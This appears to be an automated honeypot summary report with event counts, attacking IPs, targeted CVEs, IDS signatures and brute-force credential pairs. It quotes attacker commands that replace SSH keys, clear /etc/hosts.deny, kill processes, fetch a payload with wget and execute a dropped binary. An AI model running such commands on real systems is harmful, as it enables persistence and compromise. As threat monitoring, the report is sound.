# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-05T16:01:27Z
**Timeframe:** 2025-10-05T15:20:01Z to 2025-10-05T16:00:01Z
**Files Used:**
- agg_log_20251005T152001Z.json
- agg_log_20251005T154001Z.json
- agg_log_20251005T160001Z.json

## Executive Summary

This report summarizes honeypot activity over a 40-minute period. A total of 12,791 events were recorded across 16 honeypot services. The majority of attacks were SSH brute-force attempts captured by the Cowrie honeypot. A significant number of events were also logged by the Ciscoasa and Suricata honeypots. The top attacking IP address was 134.199.192.130, responsible for over 16% of the total recorded events. Attackers primarily targeted port 22 (SSH) and port 25 (SMTP). A variety of CVEs were targeted, with CVE-2005-4050 being the most frequent.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 7766
- Suricata: 1471
- Ciscoasa: 1431
- Mailoney: 835
- Sentrypeer: 602
- Honeytrap: 393
- Adbhoney: 76
- Tanner: 59
- H0neytr4p: 45
- Dionaea: 37
- Redishoneypot: 27
- ConPot: 21
- Dicompot: 9
- Honeyaml: 9
- ElasticPot: 5
- Ipphoney: 5

### Top Attacking IPs
- 134.199.192.130
- 176.65.141.117
- 172.86.95.98
- 4.213.160.153
- 103.226.139.143
- 103.124.100.181
- 124.225.158.200
- 115.190.98.228
- 202.143.111.141
- 95.216.194.41

### Top Targeted Ports/Protocols
- 22
- 25
- 5060
- TCP/5900
- UDP/5060
- TCP/80
- TCP/22
- 80
- 443
- TCP/5432

### Most Common CVEs
- CVE-2005-4050
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2021-44228
- CVE-2021-3449
- CVE-2001-0414
- CVE-2024-4577
- CVE-2002-0953
- CVE-2006-2369
- CVE-2019-11500

### Commands Attempted by Attackers
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `top`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `Enter new UNIX password:`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp/; busybox wget ...`
- `cd /tmp && chmod +x Zhk1EoHq && bash -c ./Zhk1EoHq`
- `./Zhk1EoHq`

### Signatures Triggered
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET VOIP MultiTech SIP UDP Overflow
- ET SCAN Potential SSH Scan
- ET INFO Reserved Internal IP Traffic
- ET INFO curl User-Agent Outbound
- ET HUNTING curl User-Agent to Dotted Quad
- ET SCAN Suspicious inbound to PostgreSQL port 5432
- GPL SNMP request udp

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/nPSpP4PBW0
- root/3245gs5662d34
- novinhost/novinhost.org
- test/zhbjETuyMffoL8F
- root/2glehe5t24th1issZs
- novinhost/3245gs5662d34
- root/123456789
- root/Ac123456
- kris/kris
- root/P@$$w0rd2024
- root/LeitboGi0ro
- admin/admin$123
- admin/3245gs5662d34

### Files Uploaded/Downloaded
- wget.sh;
- w.sh;
- c.sh;
- sh
- gitlab_logo-7ae504fe4f68fdebb3c2034e36621930cd36ea87924c11ff65dbcb8ed50dca58.png
- ns#
- sign_in
- no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png
- 172.20.254.127

### HTTP User-Agents
- No user agents recorded in this period.

### SSH Clients and Servers
- No specific SSH clients or servers recorded in this period.

### Top Attacker AS Organizations
- No AS organizations recorded in this period.

## Key Observations and Anomalies
- The high volume of attacks from a single IP address (134.199.192.130) suggests a targeted or persistent attacker.
- The variety of CVEs targeted indicates that attackers are using a broad set of exploits to maximize their chances of a successful compromise.
- The commands executed post-compromise focus on reconnaissance, establishing persistence, and disabling security measures. The repeated use of commands to modify SSH authorized_keys is a common tactic for maintaining access.
- The presence of Mailoney traffic targeting port 25 (SMTP) is a noteworthy trend, indicating interest in exploiting email servers for spam or phishing campaigns.
- No HTTP User-Agents, specific SSH clients/servers, or AS organizations were recorded in the logs for this period. This could be due to the nature of the attacks (e.g., direct IP-based attacks) or a lack of detailed logging for these fields.
